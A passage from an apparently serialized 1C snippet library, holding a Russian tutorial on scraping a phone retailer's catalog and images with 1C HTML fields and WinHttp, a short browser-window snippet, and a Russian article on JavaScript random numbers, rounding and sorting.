2. Создаем форму обработки с командной панелью снизу и сверху (они могут быть полезными)
3. Размещаем на ней Панель и обзываем первую страницу ""СамСайт""
4. Кладем на страницу ""СамСайт"" ПолеHTMLДокумента и обзываем его к примеру ""Сайт""
5. Переименовываем кнопку ""Выполнить"", которая находится на нижней панели в ""Загрузить сайт""
6. Описываем процедуру нажатия на эту кнопку так:
Код 1C v 8.х
   ЭлементыФормы.Сайт.Перейти(""http://www.svyaznoy.ru/catalog/phone/224""); //Категория с мобильными телефонами   

7. Проверяем работу нашей обработки. У меня появился сайт связного. А у Вас?

Дальше сложнее. Все еще хочешь парсить сайты? Тогда читай:

Сам парсинг сайта заключается в обходе всех элементов загруженной страницы, выдергивания необходимой информации и запихивания их в табличную часть. Для этого:
1. Создадим табличную часть ""Производители"" с реквизитами ""Отметка"" (Булево), ""Наименование"" (Строка 100) и ""Ссылка"" (Строка 300).
2. Добавляем еще одну страницу на панели и обзываем ее ""Производители""
3. Размещаем на этой странице одноименную табличную часть
4. Добавляем на нижней панели кнопку ""Заполнить производителей"" с кодом:
Код 1C v 8.х
        Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
              Если Стр.tagName = ""H1"" и Стр.innerText = ""Производители"" Тогда
                  Для Каждого опСтр из Стр.nextSibling.children Цикл
                      новСтр = Производители.Добавить();
                      новСтр.Наименование = опСтр.innerText;
                      новСтр.Ссылка = опСтр.firstChild.href;
                  КонецЦикла;
                  Возврат;
              КонецЕсли;
          КонецЦикла;   


Здесь напрашиваются небольшие пояснения:
tagName - имя HTML тега в HTML документе
nextSubling - следующий элемент HTML документа от текущего
children - список дочерних элементов
firstChild - первый дочерний элемент от текущего
5. Проверям. При проверке важно, находиться на странице ""СамСайт"", чтобы заполнять производителей

Производители заполнены. Теперь к самим телефонам

1. Создаем табличную часть ""Товары"" с реквизитами ""Производитель"" (Строка 100), ""Наименование"" (Строка 100), ""Цена"" (Число 10,2), ""Картинка"" (Строка 300), ""Описание"" (Строка Неограниченная), ""ОС"" (строка 100), ""Ссылка"" (Строка,300)
2. Добавляем еще одну страницу на панели и обзываем ее ""Товары""
3. Размещаем на этой странице одноименную табличную часть
4. Добавляем на нижней панели кнопку ""Заполнить товары"" с кодом:
Код 1C v 8.х
       Для Каждого Стр из Производители Цикл
          //Если отметку сняли - то не трогаем этого производителя
          Если Не Стр.Отметка Тогда
              Продолжить;
          КонецЕсли;
          Форма = ПолучитьФорму(""ФормаТоваров"");
          Форма.ЭлементыФормы.Сайт.Перейти(Стр.Ссылка);
          Форма.ТекущийПроизводитель = Стр;
          Форма.ОткрытьМодально();
      КонецЦикла;   


5. Создаем форму обработки ""ФормаТоваров""
6. Кладем на ""ФормаТоваров"" ПолеHTMLДокумента и называем его ""Сайт""
7. На событие ДкументСформирован у ПоляHTMLДокумента пишем код:
Код 1C v 8.х
  Если ЭлементыФормы.Сайт.Документ.body.all.length>1 Тогда
          ГрузимТовары();
      КонецЕсли;   


8. Создаем переменную в модуле формы
перем ТекущийПроизводитель Экспорт;
9. Создаем процедуру ГрузимТовары():
Код 1C v 8.х
       Процедура ГрузимТовары()
          Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
              Если Стр.className = ""ct_desc cleared"" Тогда
                  новСтр = Товары.Добавить();
                  Для Каждого опСтр из Стр.children Цикл
                      Если опСтр.className = ""pic_and_comp"" Тогда
                          новСтр.Картинка = СтрЗаменить(Сред(опСтр.firstChild.style.backgroundImage,5),"")"","""")
                      КонецЕсли;
                      Если опСтр.className = ""name"" Тогда
                          новСтр.Наименование = опСтр.innerText;
                          новСтр.Ссылка = опСтр.firstChild.href;
                      КонецЕсли;
                      Если опСтр.className = ""price"" Тогда
                          новСтр.Цена = Число(СтрЗаменить(СтрЗаменить(опСтр.innerText,""-"",""""),"" "",""""));
                      КонецЕсли;
                      Если опСтр.className = ""desc"" Тогда
                          новСтр.Описание = опСтр.innerText;//опСтр.innerHTML - если нужно вместе с тегами 

                      КонецЕсли;
                  КонецЦикла;

              КонецЕсли;

          КонецЦикла;
          Закрыть();
      КонецПроцедуры   


10. Проверям. Все работает.

Дело осталось за ""операционной системой"" и еще надо загрузить картинки. Давайте по порядку. Чтобы получить ""ОС"" нам надо открыть этот товар и считать ""ОС"" оттуда. Для этого делаем следующее:

1. Добавляем на нижней панели кнопку ""Доп Инфо"" с кодом:
Код 1C v 8.х
 Для Каждого Стр из Товары Цикл
          Форма = ПолучитьФорму(""ФормаДопИнфо"");
          Форма.ЭлементыФормы.Сайт.Перейти(Стр.Ссылка);
          Форма.ТекущийТовар = Стр;
          Форма.ОткрытьМодально();
      КонецЦикла;   


2. Создаем форму обработки ""ФормаДопИнфо""
3. Кладем на ""ФормаДопИнфо"" ПолеHTMLДокумента и называем его ""Сайт""
4. На событие ДкументСформирован у ПоляHTMLДокумента пишем код:
Код 1C v 8.х
   Если ЭлементыФормы.Сайт.Документ.body.all.length>1 Тогда
          ГрузимДопИнфо();
      КонецЕсли;   


5. Создаем переменную в модуле формы
перем ТекущийТовар Экспорт;
6. Создаем процедуру ГрузимДопИнфо():
Код 1C v 8.х
       Процедура ГрузимДопИнфо();
          Для Каждого Стр из ЭлементыФормы.Сайт.Документ.body.all Цикл
              Если Стр.className = ""card_spec"" Тогда
                  Для Каждого опСтр из Стр.children Цикл
                      Если Найти(опСтр.innerText,""Операционная система:"") Тогда
                          ТекущийТовар.ОС = СокрЛП(СтрЗаменить(опСтр.innerText,""Операционная система:"",""""));
                      КонецЕсли;
                  КонецЦикла;
              КонецЕсли;
          КонецЦикла;
          Закрыть();
      КонецПроцедуры   


7. Проверяем и переходим к последнему пункту

Заметили как похожи две последние инструкции? То-то же. Стремился к универсальности. Ну и наконец последний этап - Сохраним все изображения к примеру на диск ""С"" в папку ""связной"". Поехали

1. Добавляем на нижней панели кнопку ""Сохранить Картинки"" с кодом:
Код 1C v 8.х
       Для Каждого Стр из Товары Цикл
              путьСамФайл = Лев(Стр.Картинка,Найти(Стр.Картинка,"".jpg/"") + 3);
              самФайл = СтрЗаменить(СтрЗаменить(ПутьСамФайл,""http://static.svyaznoy.ru/upload/iblock/"",""""),""/"","""");
              Стр.Картинка = СохранитьКартинкуСайта(""C:\Svyaznoy"",ПутьСамФайл,СамФайл);
          КонецЦикла;   


2. Добавляем функцию СохранитьКартинкуСайта:
Код 1C v 8.х
       Функция СохранитьКартинкуСайта(КаталогСохранения,КартинкаНаСайте,КартинкаУНас)
              ИмяФайлаКартинки = КаталогСохранения + ""\"" + КартинкаУНас;
              ГетЗапрос = Новый COMОбъект(""WinHttp.WinHttpRequest.5.1"");
              ГетЗапрос.SetTimeouts(10000, 10000, 10000, 10000);
              БазовыйУРЛ = КартинкаНаСайте;
              Хидер1 = ""Content-Type"";
              Хидер2 = ""image/jpg""; // Тип рисунка.
              ГетЗапрос.Open(""GET"", БазовыйУРЛ, False); // Синхронный режим.
              ГетЗапрос.setRequestHeader(Хидер1, Хидер2);
              ГетЗапрос.Send();
              СтатусОтправки = ГетЗапрос.status;
              Если СтатусОтправки <> 200 Тогда
                  Сообщить(""Ошибка отправки запроса на: ""
                      + КартинкаНаСайте);
                  Возврат """";
              КонецЕсли;        

              Стрим = Новый COMОбъект(""ADODB.Stream"");
              Стрим.Mode = 3;
              Стрим.Type = 1;
              Стрим.Open();
              Стрим.Write(ГетЗапрос.responseBody);

              Стрим.SaveToFile(ИмяФайлаКартинки, 2);
              Стрим.Close();
              Возврат ИмяФайлаКартинки;
      КонецФункции   


На этом наша эпопея с парсингом закончена. Это всего лишь пример того, как это можно сделать. Приложив сюда немного своего кода - можно сделать парсер для любого сайта. Скачивать файлы может только зарегистрированный пользователь! 
Имея парсер 1С - я могу спарсить все, кроме этого парсера. Имя два парсера 1С - я могу спарсить все )
Автор: opx"}
},
{0,
{"Документ.parentWindow или defaultView",0,0,"","ДокументБраузера = Элементы.ПолеHTMLДокумента.Документ;
ОкноБраузера     = ДокументБраузера.parentWindow; // IE (или для платформа до 8.14)
Если ОкноБраузера = Неопределено Тогда
	ОкноБраузера = ДокументПервогоБраузера.defaultView; // Прочие браузеры
КонецЕсли;"}
}
},
{5,
{"Расширение языков программирования (COMОбъект, MSScriptControl: JavaScript, JScript,  VBscript)",1,0,"",""},
{2,
{"JavaScript",1,0,"",""},
{0,
{"Математические функции в JavaScript",0,0,"","Математические функции в JavaScript
Чтобы работать с математикой в JavaScript, вам достаточно иметь понятия о таких вещах как функция, операнд и оператор. Этот список начинается с таких вещей как сортировка, округление и генерация случайных значений..
 Admin » 21.07.2017, 10:17 » Категория: WEB-Разработка / HTML, CSS, PHP, JScript

Математика в JavaScript
Математика в JavaScript
Наличие чисел и числовых данных позволяет вам каким-либо образом работать с языком. Но помимо работы с арифметическими операторами в JavaScript, математические конструкции могут быть сложной задачей для новичков. По этой причине, нужно концентрироваться не на синтаксисе, а на общих математических функциях, этот список начинается с таких вещей как сортировка, округление и генерация случайных значений, этого достаточно, прежде чем углубляться в детали.

Работа со случайными числами
Случайные числа часто требуются в JavaScript, к примеру, для отрисовки звезд, разбросанных по ночному небу. Но есть много различных видов случайностей, и в зависимости от логики и потребностей вашего приложения вам может понадобиться один из них.

Основной случай
Самая простая форма случайности - это функция Math.random(), встроенная в JavaScript.

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.random() // 0.19401081069372594
Math.random() всегда возвращает число с плавающей точкой между 0 и 1. С технической точки зрения число, возвращаемое при помощи Math.random() может быть 0, но никогда не будет равно 1.

Если вы часто используйте Math.random(), используйте свою собственную функцию в сценариях:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function getRandom() {
 return Math.random();
}
Проблема, конечно, в том, что данная функция всегда будет создавать случайное число в пределах весьма ограниченного диапазона, далее мы постараемся рассмотреть некоторые рекомендации предназначенные для решения этой проблемы.

Случайное число в интервале [min, max)
Расширение такой функциональности требует немного математики:

Случайное число с плавающей точкой:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function getRandomFloat(min, max) {
 return Math.random() * (max - min) + min;
}

getRandomFloat(11, 101)
// 75.31898734299466
Целочисленное случайное число:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function getRandomInt(min, max) {
 return Math.floor(Math.random() * (max - min)) + min;
}

getRandomInt(10, 20)
// 12
Случайное число в интервале [min, max]:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function getRandomInRange(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
}

getRandomInRange(1, 10)
// 7
Булевские случайные величины (true/false)
Если вы хотите простую случайность 0 или 1, представляющую подбрасывание монеты:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function coinToss() {
 return Math.floor(Math.random() * 2);
}

coinToss();
// 0
Если вам нужно получить true или false:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function coinToss() {
 return (Math.floor(Math.random() * 2) === 0);
}

coinToss();
// true
Или же:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function coinToss() {
   return Math.random()<.5;
}

coinToss();
// true
Если вы хотите связать конкретные слова со сторонами монеты (да / нет, верх / низ и т.д.):

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function coinFlip() {
 return (Math.floor(Math.random() * 2) === 0) ? ""up"" : ""down"";
}

coinFlip();
// up
Случайные величины с исключениями
Для ограниченного диапазона целых чисел необходимо создать массив чисел, которые вы хотели бы извлечь и в дальнейшем выбрать случайным образом из этого массива:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let numPool = [ 1, 3, 5, 7, 9, 10 ],
rand = numPool[Math.floor(Math.random() * numPool.length)];
Можно также использовать массив чисел, которые вы хотите исключить, и приготовить пустой массив, в котором будет содержаться результат фильтрации из первого массива во второй:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let numPool = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 ];
let excludePool = [ 3, 4 ];
let filteredPool = [];
Затем в цикле прогоняем массив numPool, если выпавшее число существует и находится в массиве excludePool, помещаем результат в filteredPool:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
for (let i = 0; i < numPool.length; i++) {
 if (excludePool.indexOf(numPool[i]) === -1) {
 filteredPool.push(numPool[i]);
 }
}
И, наконец, получаем случайные числа из массива filteredPool:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let rand = filteredPool[Math.floor(Math.random() * filteredPool.length)];
Случайные величины без повторений
Для небольшого набора чисел необходимо создать массив, заполненный элементами, далее перетасуйте их в случайном порядке, поместите результат в новый массив, а затем вытаскивайте по одному:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let numPool = [ 13, 21, 36, 14, 27, 10 ];
   
function shuffle(numPool) {

 for(
 let j, x, i = numPool.length; i; 
 j = parseInt(Math.random() * i), 
 x = numPool[--i], 
 numPool[i] = numPool[j], 
 numPool[j] = x
 );

 return numPool;
};

let randomResult = shuffle(numPool);
while( randomResult.length > 0 ) {
 console.log( randomResult.pop() );
}
Для получения более широкого диапазона чисел, создайте и заполните массив случайными числами, исключая любые, которые были ранее сгенерированы:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let numReserve = []
while (numReserve.length < 12) {
 let randomNumber = Math.ceil(Math.random() * 1000);
 let found = false;
 for (let i = 0; i < numReserve.length; i++) {
 if (numReserve[i] === randomNumber){ 
 found = true;
 break;
 }
 }
 if (!found) { numReserve[numReserve.length]=randomNumber; }
}
В приведенном выше коде numReserve заполняется 12ю случайными числами от 0 до 1000.

Криптографические случайные величины
К сожалению, ни один из выше методов не создает число с достаточной хаотичностью для криптографически защищенных функций (Math.random() не является достаточной функцией, которая генерирует случайные числа). Поэтому, мы можем использовать Web Cryptography API путем создания typedArray:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let cryptoStor = new Uint16Array(8);
В этом случае мы создаем массив с восемью различными слотами, каждый из которых содержит беззнаковое 16-разрядное целое число. Существуют и другие варианты Int8Array, Uint8Array, int16Array, Int32Array и Uint32Array.

Затем, необходимо заполнить массив случайными числами определенного типа:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
window.crypto.getRandomValues(cryptoStor);
// [43484, 57947, 46691, 49849, 24272, 11827, 28203, 17423]
Ко всему прочему, Web Cryptography API имеет хорошую поддержку в современных браузерах.

Округления
Очень часто вычисления в JavaScript дают не совсем те результаты, которые мы хотим. Разумеется, мы можем делать с числами что угодно - округлять в большую или меньшую сторону, устанавливать диапазоны, отсекать ненужные числа до определенного количества знаков после запятой, все зависит от того, что вы хотите сделать в дальнейшем с этим числом.

Зачем необходимо округление?
Одним из любопытных аспектов JavaScript является то, что он на самом деле не хранит целые числа, мы сразу же работаем с числами с плавающей точкой. Это, в сочетании с тем фактом, что многие дробные значения не могут быть выражены конечным числом знаков после запятой, в JavaScript мы можем получить такие результаты:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
0.1 * 0.2;
> 0.020000000000000004

0.3 - 0.1
> 0.19999999999999998
Для практических целей эта неточность не имеет никакого значения, в нашем случае мы говорим об ошибке в квинтиллионных долях, однако, кого-то это может разочаровать. Мы можем получить несколько странный результат и при работе с числами, которые представляют собой значения валют, процентов или размеров файла. Для того, чтобы исправить эти неточности, нам как раз и необходимо уметь округлять результаты, при этом достаточно установить десятичную точность.

Округление чисел имеет практическое применение, мы можем манипулировать числом в некотором диапазоне, например, хотим округлить значение до ближайшего целого числа, а не работать только с десятичной частью.

Округление десятичных чисел
Для того, чтобы отсечь десятичное число, используйте toFixed или метод toPrecision. Оба они принимают единственный аргумент, который определяет, соответственно, сколько значащих цифр (т.е. общее количество цифр, используемых в числе) или знаков после запятой (количество после десятичной точки) должен включать в себя результат:

Если аргумент не определен для toFixed(), то по умолчанию он будет равен нулю, что означает 0 знаков после запятой, аргумент имеет максимальное значение, равное 20.
Если аргумент не задан для toPrecision, число остается нетронутым

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let randNum = 6.25;
randNum.toFixed();
// ""6""
КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.PI.toPrecision(1);
// ""3""
КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
randNum = 87.335;
randNum.toFixed(2);
// ""87.33""
КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
randNum = 87.337;
randNum.toPrecision(3);
// ""87.3""
Оба метода toFixed() и toPrecision() возвращают строковое представление результата, а не число. Это означает, что при суммировании округленного значения с randNum будет произведена конкатенация строк, а не сумма чисел:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let randNum = 6.25;
let rounded = randNum.toFixed(); // ""6""
console.log(randNum + rounded);
// ""6.256""
Если вы хотите, чтобы результат имел числовой тип данных, то вам необходимо будет применить parseFloat:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let randNum = 6.25;
let rounded = parseFloat(randNum.toFixed(1));
console.log(rounded);
// 6.3
Обратите внимание, что значения 5 округлены, за исключением редких случаев.

Методы toFixed() и toPrecision() являются полезными, ибо они могут не только отсекать дробную часть, но и дополнять знаки после запятой, что удобно при работе с валютой:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let wholeNum = 1
let dollarsCents = wholeNum.toFixed(2);
console.log(dollarsCents);
// ""1.00""
Стоить обратите внимание, что toPrecision будет давать результат в экспоненциальной записи, если число целых чисел больше, чем сам сама точность:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let num = 123.435
num.toPrecision(2);
// ""1.2e+2""
Как избежать ошибок округления с десятичными числами
В некоторых случаях, toFixed и toPrecision округляет значение 5 в меньшую сторону, а в большую:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let numTest = 1.005;
numTest.toFixed(2);
// ""1.00""
Результат расчета выше должен был быть 1.01, а не 1. Если вы хотите избежать подобную ошибку, мы можем использовать решение, предложенное Jack L Moore, которое использует экспоненциальные числа для расчета:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function round(value, decimals) {
 return Number(Math.round(value+'e'+decimals)+'e-'+decimals);
}
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
round(1.005,2);
// 1.01
Машинное эпсилон округление
Альтернативный метод округления десятичных чисел был введен в ES6. Машинное эпсилон округление обеспечивает разумный предел погрешности при сравнении двух чисел с плавающей точкой. Без округления, сравнения могут дать результаты, подобные следующим:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
0.1 + 0.2 === 0.3
// false
Мы используем Math.EPSILON в нашей функции для получения корректного сравнения:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function epsEqu(x, y) {
 return Math.abs(x - y) < Number.EPSILON * Math.max(Math.abs(x), Math.abs(y));
}
Функция принимает два аргумента: первый - текущий расчет, второй - ожидаемый результат. Она возвращает сравнение двух:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
epsEqu(0.1 + 0.2, 0.3)
// true
Все современные браузеры уже поддерживают ES6 математические функции, но если вы хотите получить поддержку в таких браузерах, как IE 11, используйте polyfills.

Отсечение дробной части
Все методы, представленные выше умеют округлять до десятичных чисел. Для того, чтобы просто отсечь число до двух знаков после запятой, необходимо сначала умножить его на 100, а затем полученный результат уже разделить на 100:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function truncated(num) {
 return Math.trunc(num * 100) / 100;
}

truncated(3.1416)
// 3.14
Если вы хотите приспособить метод под любое количество знаков после запятой, вы можете воспользоваться двойным побитовым отрицанием:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function truncated(num, decimalPlaces) { 
 let numPowerConverter = Math.pow(10, decimalPlaces); 
 return ~~(num * numPowerConverter)/numPowerConverter;
}
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let randInt = 35.874993;
truncated(randInt,3);
// 35.874
Округление до ближайшего числа
Для того, чтобы округлить десятичное число до ближайшего числа в большую или в меньшую сторону, в зависимости от того, к чему мы ближе всего, используйте Math.round():

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.round(4.3)
// 4

Math.round(4.5)
// 5
Обратите внимание, что «половина значения», 0.5 округляется в большую сторону по правилам математики.

Округление к меньшему до ближайшего целого числа
Если вы хотите всегда округлять в меньшую сторону, используйте Math.floor:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.floor(42.23);
// 42

Math.floor(36.93);
// 36
Обратите внимание, что округление в меньшую сторону работает для всех чисел, в том числе и для отрицательных. Представьте небоскреб с бесконечным количеством этажей, в том числе с этажами нижнего уровня (представляющий отрицательные числа). Если вы находитесь в лифте на нижним уровнем между 2 и 3 (что представляет собой значение -2.5), Math.floor доставит вас до -3:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.floor(-2.5);
// -3
Но если вы хотите избежать подобной ситуации, используйте Math.trunc(), поддерживаемый во всех современных браузерах (кроме IE / Edge):

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.trunc(-41.43);
// -41
На MDN вы найдете polyfill, который обеспечит поддержку Math.trunc в браузерах и IE / Edge.

Округление к большему до ближайшего целого числа
С другой стороны, если вам нужно всегда округлять в большую сторону, используйте Math.ceil(). Опять же, вспоминаем бесконечный лифт: Math.ceil всегда будет идти «вверх», независимо от того, является ли число отрицательное или нет:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Math.ceil(42.23);
// 43

Math.ceil(36.93);
// 37

Math.ceil(-36.93);
// -36
Округление до большего/меньшего необходимого числа
Если мы хотим, чтобы округлить до ближайшего числа, кратного 5, самый простой способ создать функцию, которая делит число на 5, округляет его, а затем умножает его на ту же сумму:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function roundTo5(num) {
 return Math.round(num/5)*5;
}
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
roundTo5(11);
// 10
Если вы хотите округлять до кратных своему значению, мы использовать более общую функцию, передавая в нее начальное значение и кратное:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function roundToMultiple(num, multiple) {
 return Math.round(num/multiple)*multiple;
}
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let initialNumber = 11;
let multiple = 10;
roundToMultiple(initialNumber, multiple);
// 10;
Фиксирование числа в диапазоне
Есть много случаев, когда мы хотим получить значение х, лежащее в пределах диапазона. Например, нам может понадобиться значение от 1 до 100, но при этом мы получили значение 123. Для того, чтобы исправить это, мы можем использовать минимальное (возвращает наименьшее из набора чисел) и максимальное (возвращает наибольшее из любого множества чисел). В нашем примере, диапазон от 1 до 100:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let lowBound = 1;
let highBound = 100;
let numInput = 123;
let clamped = Math.max(lowBound, Math.min(numInput, highBound));
console.log(clamped);
// 100;
Опять же, мы можем переиспользовать операцию и обернуть все это в функцию, воспользуемся решением предложенное Daniel X. Moore:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
Number.prototype.clamp = function(min, max) {
 return Math.min(Math.max(this, min), max);
};
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
numInput.clamp(lowBound, highBound);
// 100;
Гауссово округление
Гауссово округление, также известное как банковское округлением, заключается в том, что округление для этого случая происходит к ближайшему четному. Этот метод округления работает без статистической погрешности. Лучшее решение было предложено Tim Down:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function gaussRound(num, decimalPlaces) {
 let d = decimalPlaces || 0,
 m = Math.pow(10, d),
 n = +(d ? num * m : num).toFixed(8),
 i = Math.floor(n), f = n - i,
 e = 1e-8,
 r = (f > 0.5 - e && f < 0.5 + e) ?
      ((i % 2 == 0) ? i : i + 1) : Math.round(n);
 return d ? r / m : r;
}
Теперь:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
gaussRound(2.5)
// 2

gaussRound(3.5)
// 4

gaussRound(2.57,1)
// 2.6
Десятичный знак в CSS:
Так как JavaScript часто используется для создания позиционного преобразования HTML-элементов, вы можете задаться вопросом, что произойдет, если мы cгенерируем десятичные значения для наших элементов:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
#box { width: 63.667731993px; }
Хорошая новость заключается в том, что современные браузеры будут учитывать десятичные значения в блочной модели, в том числе в процентных или пиксельных единицах измерения.

Сортировка
Очень часто нам приходится сортировать какие-либо элементы, например, у нас есть массив игровых рекордов, при этом они должны быть организованы по убыванию ранга игроков. К сожалению, стандартный метод sort() имеет некоторые удивительные ограничения: он хорошо работает с часто употребляемыми английскими словами, но сразу же ломается при встрече с числами, уникальными символами или словами в верхнем регистре.

Сортировка в алфавитном порядке
Казалось бы, сортировки массива по алфавиту должна быть простейшей задачей:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let fruit = [""butternut squash"", ""apricot"", ""cantaloupe""];
fruit.sort();

// ""apricot"", ""butternut squash"", ""cantaloupe""]
Тем не менее мы сталкиваемся с проблемой, как только один из элементов находится в верхнем регистре:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let fruit = [""butternut squash"", ""apricot"", ""Cantalope""];
fruit.sort();

// ""Cantaloupe"", ""apricot"", ""butternut squash""]
Это связано с тем, что, по умолчанию, сортировщик сравнивает первый символ представленный в Unicode. Unicode - это уникальный код для любого символа, независимо от платформы, независимо от программы, независимо от языка. Например, если смотреть по кодовой таблице символ «a» имеет значение U+0061 (в шестнадцатеричной системе 0x61), в то время как символ «C» имеет код U+0043 (0x43), который идет раньше в Unicode-таблице, чем символ «a».

Чтобы отсортировать массив, который может содержать смешанные регистры первых букв, нам необходимо либо преобразовать все элементы временно в нижний регистру, или определить свой порядок сортировки при помощи метода localeCompare() c некоторыми аргументами. Как правило, для такого случая, лучше сразу создать функцию для многократного использования:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function alphaSort(arr) {
 arr.sort(function (a, b) {
 return a.localeCompare(b, 'en', {'sensitivity': 'base'});
 });
}

let fruit = [""butternut squash"", ""apricot"", ""Cantaloupe""];
alphaSort(fruit)

// [""apricot"", ""butternut squash"", ""Cantaloupe""]
Если вы хотите получить массив отсортированный в обратный алфавитном порядке, просто поменяйте позициями а и b в функции:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function alphaSort(arr) {
 arr.sort(function (a, b) {
 return b.localeCompare(a, 'en', {'sensitivity': 'base'});
 });
}

let fruit = [""butternut squash"", ""apricot"", ""Cantaloupe""];
alphaSort(fruit)

// [""Cantaloupe"", ""butternut squash"", ""apricot""]
Тут стоит обратить внимание, что localeCompare используется с аргументами, еще надо помнить, что он поддерживается IE11+, для более старых версий IE, мы можем использовать его без аргументов, и в нижнем регистре:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
function caseSort(arr) {
 arr.sort(function (a, b) {
 return a.toLowerCase().localeCompare(b.toLowerCase());
 });
}

let fruit = [""butternut squash"", ""apricot"", ""Cantaloupe""];
caseSort(fruit)

// [""apricot"", ""butternut squash"", ""Cantaloupe""]
Числовая сортировка
С некоторыми числовыми массивами сортировка работает просто идеально, но в какой-то момент результат может быть непредсказуемым:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let highScores = [11, 57, 10, 16, 32, 100];
highScores.sort();

// [10, 100, 11, 16, 32, 57]
Дело в том, что метод sort() производит лексикографическую сравнение: а это означает, что числа будут преобразованы в строку и сравнения будут снова проводиться путем сопоставления первого символа этой строки в порядке символов Unicode-таблицы. Поэтому нам снова необходимо определить свой порядок сортировки:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let highScores = [11, 57, 10, 16, 32, 100];
highScores.sort( function(a,b) { return a - b; } ); 

// [10, 11, 16, 32, 57, 100]
Опять же, для сортировки чисел в обратном порядке, поменяйте позициями a и b в функции.

Сортировка JSON-подобной структуры
И наконец, если у нас есть JSON-подобная структура данных:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
let scores = [
 {
 ""name"": ""Daniel"",
 ""score"": 21768
 },
 {
 ""name"": ""Michael"",
 ""score"": 33579
 },
 {
 ""name"": ""Alison"",
 ""score"": 38395
 }
];
В ES6+, вы можете использовать стрелочные функции:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
scores.sort((a, b) => b.score - a.score));
Для старых браузеров, не имеющих такую поддержку:

КОД: ВЫДЕЛИТЬ ВСЁ РАЗВЕРНУТЬ
scores.sort(function(a, b) { return a.score - b.score });
Как видите, сортировка в JavaScript это довольно не очевидная вещь, я надеюсь, что эти примеры облегчат как-нибудь жизнь.

Работа со степенными функциями
Возведение в степень - операция, первоначально определяемая как результат многократного умножения натурального числа на себя, квадратный корень из числа a - число, дающее a при возведении в квадрат. Этими функциями мы могли пользоваться постоянно в повседневной жизни на уроках математики, в том числе при вычислении площадей, объемов или даже при физическом моделировании.

